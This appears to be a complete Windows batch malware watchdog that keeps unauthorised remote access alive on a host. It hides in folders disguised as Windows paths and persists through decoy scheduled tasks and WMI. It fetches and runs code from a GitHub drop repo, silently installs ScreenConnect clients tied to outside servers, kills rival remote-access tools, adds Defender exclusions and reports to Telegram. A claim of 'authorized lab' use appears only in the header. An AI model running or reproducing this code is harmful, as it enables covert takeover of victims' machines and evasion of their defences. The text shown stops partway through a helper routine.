@echo off
rem ═══════════════════════════════════════════════════════════════
rem  OWN_MON  BUILD 20260802M29
rem  Persistent watchdog - identity-aware (anti-signature), mutual
rem  Gryxa: no reinstall when Running (stop panel duplicates); 8h FP drift only.
rem  Authorized internal deployment - lab/competition scope only.
rem ═══════════════════════════════════════════════════════════════
setlocal EnableDelayedExpansion

set "KEEP_FP=5f6010579852e507"
set "ALT_FP=f861c8140d453427"
set "GRYXA_FP=9908198e668e4750"
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "LOG=%WD%\own_mon.log"
set "STATE=%WD%\own_mon.state"
set "HBFLAG=%WD%\hb.flag"
set "CURL=%SystemRoot%\System32\curl.exe"
set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1?t=%RANDOM%%RANDOM%"
set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t=%RANDOM%%RANDOM%"
set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
set "MSICACHE=%WD%\pkg.msi"
set "MSI_G=%ProgramData%\ScreenConnect.Gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"

if not exist "%WD%" md "%WD%" 2>nul
if not exist "%LOG%" type nul>"%LOG%" 2>nul

set "MONVER=M29"
set "PF86=%ProgramFiles(x86)%"
set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
rem load current Gryxa FP (may rotate when server/keys change)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
if not defined GRYXA_FP set "GRYXA_FP=9908198e668e4750"
for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
echo.>>"%LOG%"
echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
set "COUNT=0"
set "INSTALLED=0"
set "PRIM_OK=0"
set "ALT_OK=0"
set "FOREIGN_LEFT=0"
set "FOREIGN_LIST="
set "MSIEXIT=not-run"

rem ── [0] single-flight mutex (stop overlapping ticks racing msiexec) ──
set "MUTEX=%WD%\tick.lock"
if exist "%MUTEX%" (
  for %%A in ("%MUTEX%") do set "LOCKAGE=%%~tA"
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%MUTEX%') -and (((Get-Date)-(Get-Item -LiteralPath '%MUTEX%' -Force).LastWriteTime).TotalMinutes -lt 8)){ exit 1 } else { exit 0 }" >nul 2>&1
  if errorlevel 1 (
    echo tick_skipped_mutex_busy>>"%LOG%"
    endlocal
    exit /b 0
  )
)
echo %DATE% %TIME% %RANDOM%>"%MUTEX%"

rem ── per-host identity (anti-signature) ────────────────────────
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"

rem ── [A] auto-update core files (best effort) ──────────────────
if not exist "%CURL%" set "CURL=curl.exe"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG%" >nul 2>&1
if not exist "%WD%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG2%" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
findstr /C:"TG_REPORT BUILD" "%WD%\tg_report.new" >nul 2>&1 && for %%F in ("%WD%\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
del /f /q "%WD%\tg_report.new" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC%" >nul 2>&1
if not exist "%WD%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC2%" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
findstr /C:"OWN_SECURE BUILD" "%WD%\own_secure.new" >nul 2>&1 && for %%F in ("%WD%\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
del /f /q "%WD%\own_secure.new" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB%" >nul 2>&1
if not exist "%WD%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB2%" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.new" >nul 2>&1 && for %%F in ("%WD%\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
del /f /q "%WD%\own_lib.new" >nul 2>&1
rem self-update: download new own_mon, apply AFTER this tick (BUILD-verified)
set "SELF_UPD=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON%" >nul 2>&1
if not exist "%WD%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON2%" >nul 2>&1
findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.next" >nul 2>&1
if not errorlevel 1 for %%F in ("%WD%\own_mon.next") do if %%~zF GTR 1500 (
  fc /b "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
  if errorlevel 1 set "SELF_UPD=1"
)
if "%SELF_UPD%"=="0" del /f /q "%WD%\own_mon.next" >nul 2>&1

rem ── [B] re-arm chain 1: ownership-aware (not existence-only) ──
rem L11/M22: Query-only skipped rearm when Windows built-in tasks shared
rem default names (Diagnosis\Scheduled etc.) -> mon never ran, no log.
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
    set "TASKS_ENSURE=%%R"
  )
)
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\own_mon.cmd" (
  attrib -h -s -r "%ETL%\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
)

rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do set "WD_STATE=%%R"
  if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
)

rem ── [E] exterminate foreign SC + disallowed RMM (BEFORE heal/install,
rem     so the SC installer custom action never collides with rivals) ──
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
timeout /t 8 /nobreak >nul
set "FOREIGN_LEFT=0"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "FP=%%a"
  set "FP=!FP: =!"
  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" if /I not "!FP!"=="%GRYXA_FP%" (
    set /a COUNT+=1
    set /a FOREIGN_LEFT+=1
    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
    echo foreign_left_!FP!>>"%LOG%"
  )
)

rem ── [C] heal ScreenConnect prim/alt ────────────────────────────
for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
  set "INSTALLED=1"
  set "PRIMSTATE=%%b"
)
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "PRIM_OK=1"
  set /a COUNT+=1
)
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 set /a COUNT+=1
sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "ALT_OK=1"

if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  echo svc heal restart>>"%LOG%"
  net start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 set "PRIM_OK=1"
)
rem M16: still stopped -> repair the REGISTERED product (msiexec /fa restores
rem binaries + starts the service; L5 Repair-SCService handles stopped svcs)
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  echo svc escalate repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 set "PRIM_OK=1"
)
rem M16: orphaned service entry (product unregistered - eaten by an SC-family
rem upgrade removal) can NEVER start. Delete it and fall through to the
rem fresh-install ladder below instead of alerting "wont start" forever.
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  set "REGSTATE=unknown"
  if exist "%WD%\own_lib.ps1" for /f "delims=" %%R in ('powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"') do set "REGSTATE=%%R"
  echo orphan_check=!REGSTATE!>>"%LOG%"
  if /I "!REGSTATE!"=="no" (
    echo orphan_service_delete>>"%LOG%"
    sc delete "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
    set "INSTALLED=0"
  )
)
if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
  call :TgState DOWN "ScreenConnect (%KEEP_FP%) installed but wont start"
  goto :AfterHeal
)
if "%INSTALLED%"=="1" goto :AfterHeal

rem ── [D] primary SC missing - heal ladder ──────────────────────
rem M12: FIRST repair the registered product (recreates service without
rem touching the ALT instance); fresh msiexec install only as fallback.
echo svc missing - heal begin>>"%LOG%"
call :RepairRegistered "%KEEP_FP%"
sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "INSTALLED=1"
  set "PRIM_OK=1"
  goto :AfterHeal
)
rem refuse fresh /i if product still registered - Upgrade table can wipe ALT/GRYXA
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP_FP%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "registered-stuck" >nul 2>&1
  call :TgState DOWN "Primary registered but service missing - /fa failed; refused /i to protect ALT/GRYXA"
  goto :AfterHeal
)
rem O37: refuse sevrz /i when gryxa already present — shared legacy UpgradeCodes
rem {0C94448B}/{1F85D7FE} make sibling msiexec /i knock Gryxa OFFLINE in panel.
set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if not errorlevel 1 set "GREG=yes"
if /I "!GREG!"=="yes" (
  echo primary_skip_i_protect_gryxa>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "protect-gryxa-skip-primary-i" >nul 2>&1
  call :TgState DOWN "Primary missing - refused sevrz /i to protect Gryxa (shared SC UpgradeCodes); /fa only"
  goto :AfterHeal
)
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_URL%" "main"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1%?t=%RANDOM%" "github-pkg"
if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
if "%INSTALLED%"=="0" (
  rem prefer worker-cached .wucache\pkg.msi (same binary as deploy)
  attrib -h -s -r "%MSICACHE%" >nul 2>&1
  for %%F in ("%MSICACHE%") do if %%~zF GTR 1000000 (
    echo wucache_pkg_retry>>"%LOG%"
    attrib -h -s -r "%MSI%" >nul 2>&1
    copy /y "%MSICACHE%" "%MSI%" >nul 2>&1
  )
  for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
    echo cache retry install>>"%LOG%"
    call :NoMsiPolicy
    msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
    set "MSIEXIT=!ERRORLEVEL!"
    echo cache msiexec exit=!MSIEXIT!>>"%LOG%"
    if "!MSIEXIT!"=="1618" (
      timeout /t 30 /nobreak >nul
      msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
      set "MSIEXIT=!ERRORLEVEL!"
      echo cache_retry1618_exit=!MSIEXIT!>>"%LOG%"
    )
    call :WaitSvc
  )
)
call :RestoreAlt
call :EnsureGryxaMust
if "%INSTALLED%"=="0" (
  if exist "%WD%\msi_heal.log" (
    echo --- msi_heal.log tail --->>"%LOG%"
    powershell -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '%WD%\msi_heal.log' -Tail 10" >>"%LOG%" 2>&1
  )
  if not defined MSIEXIT set "MSIEXIT=fetch-fail"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "msi-failed" >nul 2>&1
  call :TgState FAIL "MSI install failed on all sources (msiexec exit %MSIEXIT%)"
) else (
  echo svc restored>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "restored" >nul 2>&1
  call :TgState RESTORED "ScreenConnect reinstalled OK"
)

:AfterHeal
rem M16: ALT present-but-stopped -> restart, then repair-by-GUID (every tick)
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if not errorlevel 1 (
  sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
  if errorlevel 1 (
    echo alt stopped - restart/repair>>"%LOG%"
    net start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
    sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
    timeout /t 5 /nobreak >nul
    sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
    if errorlevel 1 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  )
)
rem M17: ALT service entry deleted but product registered -> repair-by-GUID every tick
sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
if errorlevel 1 (
  echo alt_missing_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)
rem (extermination already ran pre-heal in [E]; foreign survivors counted there)

rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%WD%','%ETL%' -ErrorAction Stop } catch {}" >nul 2>&1

rem ── [G] periodic full re-secure every ~2 h ────────────────────
powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
if errorlevel 1 (
  echo periodic re-secure>>"%LOG%"
  call "%WD%\own_secure.cmd" >>"%LOG%" 2>&1
  echo done>"%WD%\sec.flag"
)

rem ── [G2] Gryxa MUST-RUN (light every tick + deep every 8h) ────
rem HARD: never reinstall when service Running (panel duplicates).
rem Deep only checks FP drift; TCP is advisory. findstr /B HEALTHY (not UNHEALTHY).
set "GRYXA_OK=0"
set "GRYXA_WAS=0"
set "DO_DEEP=0"
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "GRYXA_WAS=1"

powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
if errorlevel 1 set "DO_DEEP=1"

rem Already Running + not deep due → zero msiexec (stops panel duplicates)
if "%GRYXA_WAS%"=="1" if "%DO_DEEP%"=="0" (
  set "GRYXA_OK=1"
  echo gryxa_skip_already_running>>"%LOG%"
  goto :GryxaAfter
)

if "%DO_DEEP%"=="1" (
  echo gryxa_deep_begin>>"%LOG%"
  set "GRES="
  if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
  echo gryxa_deep_result=!GRES!>>"%LOG%"
  echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
  if not errorlevel 1 set "GRYXA_OK=1"
  rem Always advance deep timer when Running (FP check done; avoid deep every tick)
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 (
    set "GRYXA_OK=1"
    echo done>"%GRYXA_DEEP%"
  ) else if "%GRYXA_OK%"=="0" (
    call :EnsureGryxaMust
    sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
    if not errorlevel 1 (set "GRYXA_OK=1" & echo done>"%GRYXA_DEEP%")
  ) else (
    echo done>"%GRYXA_DEEP%"
  )
) else (
  if exist "%WD%\own_lib.ps1" (
    set "GRES="
    for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build %MONVER%`) do set "GRES=%%R"
    echo gryxa_light_result=!GRES!>>"%LOG%"
    echo !GRES!| findstr /I /B /C:"HEALTHY" >nul
    if not errorlevel 1 (set "GRYXA_OK=1") else (call :EnsureGryxaMust)
  ) else (
    call :EnsureGryxaMust
  )
)

:GryxaAfter
rem refresh FP after ensure (may have rotated)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 set "GRYXA_OK=1"

if "%GRYXA_OK%"=="1" if "%GRYXA_WAS%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-restored" >nul 2>&1
  call :TgState RESTORED "Gryxa ScreenConnect healthy (svc running)"
)
if "%GRYXA_OK%"=="0" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "gryxa-must-fail" >nul 2>&1
  call :TgState DOWN "Gryxa MUST-RUN - service not Running after heal"
)

rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
set "NEED_HB=0"
if "%PRIM_OK%"=="0" set "NEED_HB=1"
if %FOREIGN_LEFT% GTR 0 set "NEED_HB=1"
if "%GRYXA_OK%"=="0" set "NEED_HB=1"
if "%NEED_HB%"=="0" (
  echo hb_skip_healthy>>"%LOG%"
) else (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 360){ exit 0 } else { exit 1 }" >nul 2>&1
  if errorlevel 1 (
    echo hb>%HBFLAG%
    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
    echo digest HB sent>>"%LOG%"
  )
)

rem ── [I] self-update apply (last thing this tick) ──────────────
if "%SELF_UPD%"=="1" (
  echo self-update apply>>"%LOG%"
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  move /y "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
)
rem keep dual-path backup in sync every tick
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if exist "%WD%\own_mon.cmd" (
  attrib -h -s -r "%ETL%\etl_mon.cmd" >nul 2>&1
  copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
)
del /f /q "%MUTEX%" >nul 2>&1

echo tick done: prim=%PRIM_OK% gryxa=%GRYXA_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
endlocal
exit /b 0

rem ═══════════════ helpers ═══════════════
:EnsureGryxaMust
rem Gryxa is mandatory: keep climbing until service is RUNNING (or ladder exhausted).
set "GRYXA_OK=0"
sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
if not errorlevel 1 (
  set "GRYXA_OK=1"
  echo gryxa_already_running>>"%LOG%"
  exit /b 0
)
echo gryxa_must_begin>>"%LOG%"

rem 1) service present but stopped -> start hard
sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if not errorlevel 1 (
  echo gryxa_svc_start>>"%LOG%"
  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
  sc failure "ScreenConnect Client (%GRYXA_FP%)" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  net start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  timeout /t 6 /nobreak >nul
  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 (
    set "GRYXA_OK=1"
    echo gryxa_started_ok>>"%LOG%"
    exit /b 0
  )
)

rem 2) registered product -> msiexec /fa repair ONLY (never /i on top — kills panel session)
set "GREG=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
echo gryxa_registered=!GREG!>>"%LOG%"
if /I "!GREG!"=="yes" (
  echo gryxa_repair_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  timeout /t 8 /nobreak >nul
  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  timeout /t 5 /nobreak >nul
  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
  if not errorlevel 1 (
    set "GRYXA_OK=1"
    echo gryxa_repaired_ok>>"%LOG%"
    exit /b 0
  )
  rem clean reinstall: /x then /i (safer than /i over registered — avoids Upgrade churn)
  echo gryxa_clean_reinstall_begin>>"%LOG%"
  if exist "%WD%\own_lib.ps1" (
    for /f "usebackq delims=" %%G in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$n='ScreenConnect Client (%GRYXA_FP%)'; foreach($r in @('HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')){ if(Test-Path $r){ Get-ChildItem $r -EA 0 | %% { $p=Get-ItemProperty $_.PSPath -EA 0; if($p.DisplayName -eq $n -and $_.PSChildName -like '{*}'){ $_.PSChildName; break } } } }"`) do set "GGUID=%%G"
  )
  if defined GGUID (
    call :NoMsiPolicy
    msiexec /x !GGUID! /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
    echo gryxa_uninstall_exit=!ERRORLEVEL!>>"%LOG%"
    timeout /t 8 /nobreak >nul
  )
)

rem 3) orphan service (present, not registered) -> delete then fresh install
if /I not "!GREG!"=="yes" (
  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  if not errorlevel 1 (
    echo gryxa_orphan_svc_delete>>"%LOG%"
    sc stop "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
    sc delete "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
    timeout /t 3 /nobreak >nul
  )
  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" (
    echo gryxa_stale_dir_clean>>"%LOG%"
    rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  )
)

rem 4) fresh MSI install only when product not currently Running
echo gryxa_install_begin>>"%LOG%"
if not exist "%CURL%" set "CURL=curl.exe"
set "G_MSI_READY=0"
if exist "%MSICACHE_G%" for %%F in ("%MSICACHE_G%") do if %%~zF GTR 1000000 (
  copy /y "%MSICACHE_G%" "%MSI_G%" >nul 2>&1
  set "G_MSI_READY=1"
  echo gryxa_msi_from_cache>>"%LOG%"
)
if "%G_MSI_READY%"=="0" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
  for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
    move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
    copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
    set "G_MSI_READY=1"
    echo gryxa_msi_fetched>>"%LOG%"
  )
  del /f /q "%MSI_G%.tmp" >nul 2>&1
)
if "%G_MSI_READY%"=="0" (
